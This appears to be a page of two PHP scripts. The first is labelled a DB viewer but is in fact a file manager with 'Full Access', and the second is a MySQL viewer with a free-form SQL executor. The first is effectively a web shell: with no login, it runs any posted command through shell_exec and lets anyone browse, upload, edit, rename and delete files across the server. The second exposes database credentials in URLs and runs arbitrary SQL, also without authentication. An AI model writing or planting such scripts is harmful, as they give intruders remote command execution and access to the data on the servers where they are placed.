# Simple DB Viewer + SQL Executor
```
<?php
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // mulai dari current folder
$fullPath = realpath($currentDir);

// Cek apakah path valid
if (!$fullPath || !is_dir($fullPath)) {
    die("Directory not found.");
}

// CMD output
$cmdOutput = '';
if (isset($_POST['run_cmd']) && isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $cmdOutput = shell_exec("cd " . escapeshellarg($fullPath) . " && " . $command . " 2>&1");
}

// Handle form actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create'])) {
        file_put_contents($fullPath . '/' . $_POST['filename'], $_POST['content']);
    } elseif (isset($_POST['upload'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $fullPath . '/' . basename($_FILES['file']['name']));
    } elseif (isset($_POST['edit'])) {
        file_put_contents($fullPath . '/' . $_POST['filename'], $_POST['content']);
    } elseif (isset($_POST['rename'])) {
        rename($fullPath . '/' . $_POST['old_name'], $fullPath . '/' . $_POST['new_name']);
    }
}

if (isset($_GET['delete'])) {
    $target = $fullPath . '/' . $_GET['delete'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
}

$files = scandir($fullPath);
$fileContent = '';
$fileToEdit = '';
if (isset($_GET['open'])) {
    $target = $fullPath . '/' . $_GET['open'];
    if (is_file($target)) {
        $fileContent = htmlspecialchars(file_get_contents($target));
        $fileToEdit = $_GET['open'];
    }
}

// Parent dir logic
$parentDir = dirname($fullPath);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Manager (Full Access)</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        textarea, pre { width: 100%; }
        textarea { height: 200px; }
        .cmd-box { background: #000; color: #0f0; padding: 10px; white-space: pre-wrap; margin-top: 10px; }
        ul { list-style-type: none; padding-left: 0; }
        li { margin: 5px 0; }
    </style>
</head>
<body>

<h2>📁 File Manager</h2>
<p>Current Directory: <strong><?php echo htmlspecialchars($fullPath); ?></strong></p>

<form method="get">
    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($parentDir); ?>">
    <button type="submit">⬆ Go to Parent Directory</button>
</form>

<!-- CMD -->
<h3>Command Line</h3>
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command" style="width: 80%;" required>
    <button type="submit" name="run_cmd">Run</button>
</form>
<?php if ($cmdOutput): ?>
    <div class="cmd-box"><?php echo htmlspecialchars($cmdOutput); ?></div>
<?php endif; ?>

<!-- Upload -->
<h3>Upload File</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit" name="upload">Upload</button>
</form>

<!-- File/Folder List -->
<h3>Contents</h3>
<ul>
    <?php foreach ($files as $file): ?>
        <?php if ($file !== '.' && $file !== '..'): ?>
            <?php
            $path = $fullPath . '/' . $file;
            $isDir = is_dir($path);
            ?>
            <li>
                <strong><?php echo htmlspecialchars($file); ?></strong>
                <?php if ($isDir): ?>
                    <a href="?dir=<?php echo urlencode($path); ?>">[Open]</a>
                <?php else: ?>
                    <a href="?dir=<?php echo urlencode($fullPath); ?>&open=<?php echo urlencode($file); ?>">[View]</a>
                    <a href="?dir=<?php echo urlencode($fullPath); ?>&open=<?php echo urlencode($file); ?>&edit=true">[Edit]</a>
                <?php endif; ?>
                <a href="?dir=<?php echo urlencode($fullPath); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Delete this?')">[Delete]</a>
                <a href="?dir=<?php echo urlencode($fullPath); ?>&rename=<?php echo urlencode($file); ?>">[Rename]</a>
            </li>
        <?php endif; ?>
    <?php endforeach; ?>
</ul>

<!-- Create File -->
<h3>Create New File</h3>
<form method="post">
    <input type="text" name="filename" required placeholder="Filename">
    <textarea name="content" required placeholder="Content..."></textarea>
    <button type="submit" name="create">Create</button>
</form>

<!-- Edit -->
<?php if ($fileContent): ?>
    <h3>Edit File: <?php echo htmlspecialchars($fileToEdit); ?></h3>
    <form method="post">
        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($fileToEdit); ?>">
        <textarea name="content"><?php echo $fileContent; ?></textarea>
        <button type="submit" name="edit">Save</button>
    </form>
<?php endif; ?>

<!-- Rename -->
<?php if (isset($_GET['rename'])): ?>
    <h3>Rename: <?php echo htmlspecialchars($_GET['rename']); ?></h3>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
        <input type="text" name="new_name" required>
        <button type="submit" name="rename">Rename</button>
    </form>
<?php endif; ?>

<h4>🧠 CMD Cheatsheet (Linux)</h4>
<table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 100%;">
    <thead style="background-color:#f0f0f0;">
        <tr>
            <th>Command</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <tr><td><code>ls</code></td><td>List files and folders</td></tr>
        <tr><td><code>ls -la</code></td><td>List with permissions and hidden files</td></tr>
        <tr><td><code>pwd</code></td><td>Print current directory</td></tr>
        <tr><td><code>cd folder</code></td><td>Change directory</td></tr>
        <tr><td><code>cat file.txt</code></td><td>Show contents of a file</td></tr>
        <tr><td><code>nano file.txt</code></td><td>Edit file in terminal (if installed)</td></tr>
        <tr><td><code>touch file.txt</code></td><td>Create empty file</td></tr>
        <tr><td><code>mkdir newdir</code></td><td>Create new folder</td></tr>
        <tr><td><code>rm file.txt</code></td><td>Delete file</td></tr>
        <tr><td><code>rmdir folder</code></td><td>Remove empty folder</td></tr>
        <tr><td><code>rm -rf folder</code></td><td>Force delete folder and contents</td></tr>
        <tr><td><code>whoami</code></td><td>Show current user</td></tr>
        <tr><td><code>top</code></td><td>Show running processes</td></tr>
        <tr><td><code>clear</code></td><td>Clear the terminal</td></tr>
    </tbody>
</table>


</body>
</html>

```


# Simple DB Viewer + SQL Executor
```
<?php
$host = $_GET['host'] ?? '';
$user = $_GET['user'] ?? '';
$pass = $_GET['pass'] ?? '';
$db   = $_GET['db'] ?? '';
$table = $_GET['table'] ?? '';
$sql = $_POST['sql'] ?? '';

$mysqli = null;
$error_message = '';

if ($host && $user) {
    $mysqli = new mysqli($host, $user, $pass, $db ?: null);
    if ($mysqli->connect_error) {
        $error_message = $mysqli->connect_error;
    }
}

function getDatabases($mysqli) {
    $res = $mysqli->query("SHOW DATABASES");
    return $res ? array_column($res->fetch_all(), 0) : [];
}

function getTables($mysqli) {
    $res = $mysqli->query("SHOW TABLES");
    return $res ? array_column($res->fetch_all(), 0) : [];
}

$tableData = null;
if ($mysqli && $table) {
    $tableData = $mysqli->query("SELECT * FROM `$table`");
}

$sqlResult = null;
if ($mysqli && $sql) {
    $sqlResult = $mysqli->query($sql);
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Simple DB Viewer</title>
    <style>
        body { font-family: sans-serif; margin: 20px; }
        input, select, textarea { margin: 6px 0; width: 100%; padding: 6px; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ccc; padding: 6px; }
    </style>
</head>
<body>
<h2>Simple DB Viewer + SQL Executor</h2>

<?php if (!$mysqli || $error_message): ?>
    <form method="get">
        <label>Host:</label><input name="host" required value="<?= htmlspecialchars($host) ?>">
        <label>User:</label><input name="user" required value="<?= htmlspecialchars($user) ?>">
        <label>Password:</label><input name="pass" type="password" value="<?= htmlspecialchars($pass) ?>">
        <label>Database (opsional):</label><input name="db" value="<?= htmlspecialchars($db) ?>">
        <button type="submit">Connect</button>
    </form>
    <?php if ($error_message): ?><p style="color:red;">Error: <?= htmlspecialchars($error_message) ?></p><?php endif; ?>
<?php else: ?>
    <form method="get">
        <input type="hidden" name="host" value="<?= $host ?>">
        <input type="hidden" name="user" value="<?= $user ?>">
        <input type="hidden" name="pass" value="<?= $pass ?>">
        <label>Database:
            <select name="db" onchange="this.form.submit()">
                <?php foreach (getDatabases($mysqli) as $d): ?>
                    <option <?= $d === $db ? 'selected' : '' ?> value="<?= $d ?>"><?= $d ?></option>
                <?php endforeach; ?>
            </select>
        </label>
        <?php if ($db): ?>
            <label>Tabel:
                <select name="table" onchange="this.form.submit()">
                    <?php foreach (getTables($mysqli) as $t): ?>
                        <option <?= $t === $table ? 'selected' : '' ?> value="<?= $t ?>"><?= $t ?></option>
                    <?php endforeach; ?>
                </select>
            </label>
        <?php endif; ?>
    </form>

    <?php if ($tableData): ?>
        <h3>Data dari Tabel: <?= htmlspecialchars($table) ?></h3>
        <table>
            <thead>
                <tr>
                    <?php foreach ($tableData->fetch_fields() as $field): ?>
                        <th><?= $field->name ?></th>
                    <?php endforeach; ?>
                </tr>
            </thead>
            <tbody>
                <?php while ($row = $tableData->fetch_assoc()): ?>
                    <tr>
                        <?php foreach ($row as $cell): ?>
                            <td><?= htmlspecialchars((string)$cell) ?></td>
                        <?php endforeach; ?>
                    </tr>
                <?php endwhile; ?>
            </tbody>
        </table>
    <?php endif; ?>

    <h3>SQL Manual Executor</h3>
    <form method="post">
        <input type="hidden" name="host" value="<?= $host ?>">
        <input type="hidden" name="user" value="<?= $user ?>">
        <input type="hidden" name="pass" value="<?= $pass ?>">
        <input type="hidden" name="db" value="<?= $db ?>">
        <textarea name="sql" rows="5" placeholder="Ketik perintah SQL di sini..."><?= htmlspecialchars($sql) ?></textarea>
        <button type="submit">Eksekusi</button>
    </form>

    <?php if ($sql): ?>
        <h4>Hasil SQL:</h4>
        <?php if ($sqlResult instanceof mysqli_result): ?>
            <table>
                <thead>
                    <tr>
                        <?php foreach ($sqlResult->fetch_fields() as $field): ?>
                            <th><?= $field->name ?></th>
                        <?php endforeach; ?>
                    </tr>
                </thead>
                <tbody>
                    <?php while ($row = $sqlResult->fetch_assoc()): ?>
                        <tr>
                            <?php foreach ($row as $cell): ?>
                                <td><?= htmlspecialchars((string)$cell) ?></td>
                            <?php endforeach; ?>
                        </tr>
                    <?php endwhile; ?>
                </tbody>
            </table>
        <?php elseif ($sqlResult === true): ?>
            <p>Query berhasil dijalankan.</p>
        <?php else: ?>
            <p style="color:red;">Error: <?= $mysqli->error ?></p>
        <?php endif; ?>
    <?php endif; ?>
<?php endif; ?>
<h4>Cheat Sheet SQL Dasar</h4>
    <ul>
        <li><strong>SELECT</strong>: <code>SELECT * FROM nama_tabel;</code></li>
        <li><strong>INSERT</strong>: <code>INSERT INTO nama_tabel (kolom1, kolom2) VALUES ('nilai1', 'nilai2');</code></li>
        <li><strong>UPDATE</strong>: <code>UPDATE nama_tabel SET kolom1 = 'nilai_baru' WHERE id = 1;</code></li>
        <li><strong>DELETE</strong>: <code>DELETE FROM nama_tabel WHERE id = 1;</code></li>
        <li><strong>Custom</strong>: <code>SHOW TABLES;</code>, <code>DESCRIBE nama_tabel;</code></li>
    </ul>

</body>
</html>

```
